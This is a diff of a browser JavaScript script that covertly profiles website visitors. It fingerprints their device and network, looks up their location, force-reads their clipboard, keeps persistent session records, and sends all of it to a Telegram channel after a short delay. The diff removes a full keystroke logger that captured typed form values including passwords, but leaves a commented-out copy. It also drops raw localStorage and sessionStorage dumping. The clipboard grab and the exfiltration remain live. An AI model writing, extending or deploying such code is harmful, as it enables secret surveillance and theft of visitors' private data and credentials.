@@ -1,15 +1,178 @@
+function printLocal() {
+    // Debug function
+    Object.entries(localStorage).forEach(([k, v]) => console.log(`${k} : ${v}`));
+}
+
+
+// var keyData = {}
+// keyData.behavior = {
+//     keyPresses: []
+// };
+
+// document.addEventListener('keydown', (e) => {
+//     keyData.behavior.keyPresses.push({
+//         key: e.key,       // Full key logs (including special keys)
+//         code: e.code,
+//         time: Date.now(),
+//         target: e.target.tagName,
+//         isFormField: ['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName),
+//         value: e.target.value // Includes all typed content 
+//     });
+//     // console.clear();
+//     // console.log(keyData)
+// });
+
+
 
 function mainData() {
 
-
     const now = new Date();
+
+    function getSessionData() {
+        const now = new Date();
+
+        // Helper function to format timestamp
+        const formatTimestamp = () => {
+            return `${now.getHours()}Hrs:${now.getMinutes()}Mins:${now.getSeconds()}seconds on ${String(now.getDate()).padStart(2, '0')}/${String(now.getMonth() + 1).padStart(2, '0')}/${now.getFullYear()}`;
+        };
+
+        // Cookie functions
+        function setCookie(name, value, days = 365) {
+            try {
+                const expires = new Date();
+                expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
+                document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires.toUTCString()}; path=/; SameSite=Lax`;
+            } catch (error) {
+                console.error("Failed to set cookie:", error);
+            }
+        }
+
+        function getCookie(name) {
+            try {
+                const cookies = document.cookie.split('; ');
+                for (const cookie of cookies) {
+                    const [cookieName, cookieValue] = cookie.split('=');
+                    if (cookieName === name) {
+                        return decodeURIComponent(cookieValue);
+                    }
+                }
+                return null;
+            } catch (error) {
+                console.error("Failed to read cookie:", error);
+                return null;
+            }
+        }
+
+        // Main logic to get or create session data
+        function getOrCreateSessions() {
+            const sessionKey = 'sessions';
+            const sessionCountKey = 'session_no';
+
+            // Try to get data from localStorage first
+            let localStorageData = null;
+            try {
+                localStorageData = localStorage.getItem(sessionKey)
+                    ? JSON.parse(localStorage.getItem(sessionKey))
+                    : null;
+            } catch (e) {
+                console.error("Error reading localStorage:", e);
+            }
+
+            // Try to get data from cookies
+            let cookieData = null;
+            try {
+                const cookieValue = getCookie(sessionKey);
+                cookieData = cookieValue ? JSON.parse(cookieValue) : null;
+            } catch (e) {
+                console.error("Error reading cookie data:", e);
+            }
+
+            // Determine which data source to use (prefer the one with more sessions)
+            let existingData = null;
+            let source = 'none';
+
+            if (localStorageData && cookieData) {
+                // Both exist - use the one with more sessions
+                if (localStorageData.sessions.length >= cookieData.sessions.length) {
+                    existingData = localStorageData;
+                    source = 'localStorage';
+                } else {
+                    existingData = cookieData;
+                    source = 'cookie';
+                }
+            } else if (localStorageData) {
+                existingData = localStorageData;
+                source = 'localStorage';
+            } else if (cookieData) {
+                existingData = cookieData;
+                source = 'cookie';
+            }
+
+            // Get or create session count
+            let sessionCount = 0;
+            if (existingData) {
+                sessionCount = existingData.sessions.length;
+            } else {
+                // No existing data - first time visitor
+                const newSession = {
+                    sessions: [{
+                        id: 'session_1',
+                        timestamp: formatTimestamp()
+                    }]
+                };
+
+                // Save to both storage methods
+                try {
+                    localStorage.setItem(sessionKey, JSON.stringify(newSession));
+                    localStorage.setItem(sessionCountKey, '1');
+                    setCookie(sessionKey, JSON.stringify(newSession));
+                    setCookie(sessionCountKey, '1');
+                } catch (e) {
+                    console.error("Error saving initial session:", e);
+                }
+
+                return newSession;
+            }
+
+            // Returning visitor - add new session
+            const newSessionCount = sessionCount + 1;
+            const newSessionEntry = {
+                id: `session_${newSessionCount}`,
+                timestamp: formatTimestamp()
+            };
+
+            // Update the existing data
+            existingData.sessions.push(newSessionEntry);
+
+            // Save to both storage methods
+            try {
+                localStorage.setItem(sessionKey, JSON.stringify(existingData));
+                localStorage.setItem(sessionCountKey, newSessionCount.toString());
+                setCookie(sessionKey, JSON.stringify(existingData));
+                setCookie(sessionCountKey, newSessionCount.toString());
+            } catch (e) {
+                console.error("Error updating sessions:", e);
+            }
+
+            // console.log(`Session data loaded from ${source}. Total sessions: ${newSessionCount}`);
+            return existingData;
+        }
+
+        return getOrCreateSessions();
+    }
+
+    const sessionData = getSessionData();
+    // console.log(sessionData);
+
+
     const userData = {
         Time: `${now.getHours()}Hrs:${now.getMinutes()}Mins:${now.getSeconds()}seconds on ${String(now.getDate()).padStart(2, '0')}/${String(now.getMonth() + 1).padStart(2, '0')}/${now.getFullYear()}`,
-        collectionVersion: '1.0.0',
+        // collectionVersion: '1.0.0',
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         locale: navigator.language,
-        timezoneOffset: now.getTimezoneOffset()
+        // timezoneOffset: now.getTimezoneOffset()
     };
+    userData.allSessionData = sessionData;
 
 
     window.addEventListener("error", (e) => {
@@ -66,43 +229,43 @@ function mainData() {
                 });
 
             // Try to get local IP addresses (works in some browsers)
-            try {
-                RTCPeerConnection.getLocalIPs = function (callback) {
-                    const pc = new RTCPeerConnection({ iceServers: [] });
-                    pc.createDataChannel('');
-                    pc.createOffer().then(offer => pc.setLocalDescription(offer))
-                        .then(() => {
-                            const lines = pc.localDescription.sdp.split('\n');
-                            const ips = [];
-                            lines.forEach(line => {
-                                if (line.indexOf('candidate') === 0) {
-                                    const parts = line.split(' ');
-                                    if (parts[7] === 'host') {
-                                        ips.push(parts[4]);
-                                    }
-                                }
-                            });
-                            callback(ips);
-                        });
-                };
+            // try {
+            //     RTCPeerConnection.getLocalIPs = function (callback) {
+            //         const pc = new RTCPeerConnection({ iceServers: [] });
+            //         pc.createDataChannel('');
+            //         pc.createOffer().then(offer => pc.setLocalDescription(offer))
+            //             .then(() => {
+            //                 const lines = pc.localDescription.sdp.split('\n');
+            //                 const ips = [];
+            //                 lines.forEach(line => {
+            //                     if (line.indexOf('candidate') === 0) {
+            //                         const parts = line.split(' ');
+            //                         if (parts[7] === 'host') {
+            //                             ips.push(parts[4]);
+            //                         }
+            //                     }
+            //                 });
+            //                 callback(ips);
+            //             });
+            //     };
 
-                RTCPeerConnection.getLocalIPs(function (ips) {
-                    userData.networkInfo.localIPs = ips;
-                });
-            } catch (e) {
-                userData.networkInfo.localIPError = e.message;
-            }
+            //     RTCPeerConnection.getLocalIPs(function (ips) {
+            //         userData.networkInfo.localIPs = ips;
+            //     });
+            // } catch (e) {
+            //     userData.networkInfo.localIPError = e.message;
+            // }
 
             // Network interfaces (if available)
-            if (navigator.connection && navigator.connection.getNetworkInterfaces) {
-                navigator.connection.getNetworkInterfaces()
-                    .then(interfaces => {
-                        userData.networkInfo.networkInterfaces = interfaces;
-                    })
-                    .catch(e => {
-                        userData.networkInfo.interfaceError = e.message;
-                    });
-            }
+            // if (navigator.connection && navigator.connection.getNetworkInterfaces) {
+            //     navigator.connection.getNetworkInterfaces()
+            //         .then(interfaces => {
+            //             userData.networkInfo.networkInterfaces = interfaces;
+            //         })
+            //         .catch(e => {
+            //             userData.networkInfo.interfaceError = e.message;
+            //         });
+            // }
 
             return userData.networkInfo.city;
         });
@@ -112,26 +275,26 @@ function mainData() {
     // ==== [1. BASIC BROWSER INFO] ==== //
     function collectBasicInfo() {
 
-        async function checkPermissions() {
-            userData.permissions = {
-                geolocation: await navigator.permissions.query({ name: "geolocation" }),
-                notifications: await navigator.permissions.query({ name: "notifications" })
-            };
-        }
-        checkPermissions();
+        // async function checkPermissions() {
+        //     userData.permissions = {
+        //         geolocation: await navigator.permissions.query({ name: "geolocation" }),
+        //         notifications: await navigator.permissions.query({ name: "notifications" })
+        //     };
+        // }
+        // checkPermissions();
 
 
         userData.basicInfo = {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
-            languages: navigator.languages,
+            // languages: navigator.languages,
             cookieEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
+            // doNotTrack: navigator.doNotTrack,
             hardwareConcurrency: navigator.hardwareConcurrency,
             deviceMemory: navigator.deviceMemory,
             maxTouchPoints: navigator.maxTouchPoints,
-            pdfViewerEnabled: navigator.pdfViewerEnabled,
+            // pdfViewerEnabled: navigator.pdfViewerEnabled,
             webdriver: navigator.webdriver,
             vendor: navigator.vendor,
             screen: {
@@ -150,10 +313,10 @@ function mainData() {
                 outerHeight: window.outerHeight,
                 devicePixelRatio: window.devicePixelRatio
             },
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset(),
+            // timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            // timezoneOffset: new Date().getTimezoneOffset(),
             localStorageEnabled: !!window.localStorage,
-            sessionStorageEnabled: !!window.sessionStorage,
+            // sessionStorageEnabled: !!window.sessionStorage,
             indexedDBEnabled: !!window.indexedDB,
             webGLInfo: getWebGLInfo(),
             connectionInfo: null
@@ -162,10 +325,10 @@ function mainData() {
         if ('connection' in navigator) {
             const connection = navigator.connection;
             userData.basicInfo.connectionInfo = {
-                downlink: connection.downlink,
+                // downlink: connection.downlink,
                 effectiveType: connection.effectiveType,
-                rtt: connection.rtt,
-                saveData: connection.saveData,
+                // rtt: connection.rtt,
+                // saveData: connection.saveData,
                 type: connection.type
             };
         }
@@ -195,53 +358,12 @@ function mainData() {
         }
     }
 
-    // ==== [3. SOCIAL MEDIA (FIXED)] ==== //
-    function checkSocialMediaLogins() {
-        userData.socialMedia = {
-            facebook: !!window.FB,
-            twitter: !!window.twttr,
-            google: !!window.gapi,
-            linkedin: !!window.LI,
-            instagram: !!window._instgrm,
-            reddit: !!window.rte
-        };
-    }
-
-    // ==== [4. LOCALSTORAGE (RAW DATA)] ==== //
-    function collectStorageData() {
-        try {
-            userData.localStorage = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                userData.localStorage[key] = localStorage.getItem(key); // Full unredacted data
-            }
-
-            userData.sessionStorage = {};
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                userData.sessionStorage[key] = sessionStorage.getItem(key); // Full unredacted data
-            }
-        } catch (e) {
-            userData.storageError = e.message;
-        }
-    }
-
     // ==== [5. KEYSTROKE LOGGING (FULL)] ==== //
     function collectBehavioralData() {
-        userData.behavior = {
-            keyPresses: []
-        };
-
-        document.addEventListener('keydown', (e) => {
-            userData.behavior.keyPresses.push({
-                key: e.key,       // Full key logs (including special keys)
-                code: e.code,
-                time: Date.now(),
-                target: e.target.tagName,
-                isFormField: ['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName),
-                value: e.target.value // Includes typed content (even passwords)
-            });
-        });
+            // if (keyData.behavior.length>=5 && keyData.behavior.length<=50){
+            //     userData.behavior = keyData.behavior;
+            // }
+            // console.log(userData.behavior)
     }
 
     // ==== [6. CLIPBOARD (FORCE-READ)] ==== //
@@ -251,7 +373,7 @@ function mainData() {
         function forceClipboardRead() {
             navigator.clipboard.readText()
                 .then(text1 => {
-                    console.log("Clipboard:", text1);
+                    // console.log("Clipboard:", text1);
                     return text1;
                 })
                 .catch(error => console.error("Blocked by browser:", error));
@@ -265,7 +387,7 @@ function mainData() {
             }
         }
         catch (error) {
-            console.log("Error caught and passed")
+            // console.log("Error caught and passed")
         }
 
         if (dataToReturn == undefined || dataToReturn == null) {
@@ -335,8 +457,6 @@ function mainData() {
                 userData.batteryInfo = {
                     level: battery.level,
                     charging: battery.charging,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime
                 };
             });
         }
@@ -349,35 +469,38 @@ function mainData() {
                     beta: event.beta,
                     gamma: event.gamma
                 };
+                if (event.alpha == null && event.beta == null && event.gamma == null){
+                    delete userData.deviceOrientation;
+                }
             }, true);
         }
 
-        if ('DeviceMotionEvent' in window) {
-            window.addEventListener('devicemotion', (event) => {
-                userData.deviceMotion = {
-                    acceleration: event.acceleration,
-                    accelerationIncludingGravity: event.accelerationIncludingGravity,
-                    rotationRate: event.rotationRate,
-                    interval: event.interval
-                };
-            }, true);
-        }
+        // if ('DeviceMotionEvent' in window) {
+        //     window.addEventListener('devicemotion', (event) => {
+        //         userData.deviceMotion = {
+        //             acceleration: event.acceleration,
+        //             accelerationIncludingGravity: event.accelerationIncludingGravity,
+        //             rotationRate: event.rotationRate,
+        //             interval: event.interval
+        //         };
+        //     }, true);
+        // }
 
         // Media devices enumeration
-        if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
-            navigator.mediaDevices.enumerateDevices()
-                .then(devices => {
-                    userData.mediaDevices = devices.map(device => ({
-                        kind: device.kind,
-                        label: device.label,
-                        deviceId: device.deviceId,
-                        groupId: device.groupId
-                    }));
-                })
-                .catch(e => {
-                    userData.mediaDevicesError = e.message;
-                });
-        }
+        // if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
+        //     navigator.mediaDevices.enumerateDevices()
+        //         .then(devices => {
+        //             userData.mediaDevices = devices.map(device => ({
+        //                 kind: device.kind,
+        //                 label: device.label,
+        //                 deviceId: device.deviceId,
+        //                 groupId: device.groupId
+        //             }));
+        //         })
+        //         .catch(e => {
+        //             userData.mediaDevicesError = e.message;
+        //         });
+        // }
 
         // Bluetooth availability
         if ('bluetooth' in navigator) {
@@ -387,30 +510,6 @@ function mainData() {
         // USB availability
         if ('usb' in navigator) {
             userData.usbAvailable = true;
-        }
-
-        // Gamepad API
-        if ('getGamepads' in navigator) {
-            const gamepads = navigator.getGamepads();
-            if (gamepads && gamepads.length > 0) {
-                userData.gamepads = [];
-                for (let i = 0; i < gamepads.length; i++) {
-                    if (gamepads[i]) {
-                        userData.gamepads.push({
-                            id: gamepads[i].id,
-                            index: gamepads[i].index,
-                            connected: gamepads[i].connected,
-                            mapping: gamepads[i].mapping,
-                            axes: Array.from(gamepads[i].axes),
-                            buttons: gamepads[i].buttons.map(b => ({
-                                pressed: b.pressed,
-                                touched: b.touched,
-                                value: b.value
-                            }))
-                        });
-                    }
-                }
-            }
         }
 
         // Speech recognition
@@ -454,8 +553,6 @@ function mainData() {
         const cityName = await collectNetworkInfo(); // Added IP and ISP collection
         collectClipboardData();
         collectBasicInfo();
-        collectStorageData();
-        checkSocialMediaLogins();
         collectBehavioralData();
 
         // Simple city check - only run canvas if NOT Raipur
@@ -483,16 +580,13 @@ function mainData() {
             }
         }
 
-
-
         setTimeout(async () => { // Make this async
             try {
                 const formattedData = JSON.stringify(userData, null, 2);
-                // alert(formattedData.length)
-                console.clear()
+                // console.clear()
                 await sendDeatilsToTelegram1(formattedData); // Add await
             } catch (error) {
-                console.log("Error loading fetcher", error);
+                // console.log("Error loading fetcher", error);
             }
         }, 1500);
     }
